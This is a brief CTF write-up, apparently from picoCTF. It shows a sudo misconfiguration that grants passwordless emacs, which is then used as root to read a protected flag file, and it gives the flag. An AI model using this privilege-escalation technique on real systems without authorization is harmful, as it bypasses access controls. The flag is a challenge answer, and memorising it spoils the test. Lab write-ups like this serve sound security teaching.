just some sudo privilege escalation (security bypass restrictions in misconfigured systems)

```bash
ctf-player@challenge:~$ sudo -l
Matching Defaults entries for ctf-player on challenge:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User ctf-player may run the following commands on challenge:
    (ALL) NOPASSWD: /bin/emacs
ctf-player@challenge:~$ sudo /bin/emacs flag.txt
```

and read the flag:

`FLAG: picoCTF{ju57_5ud0_17_f6cc9dec}`
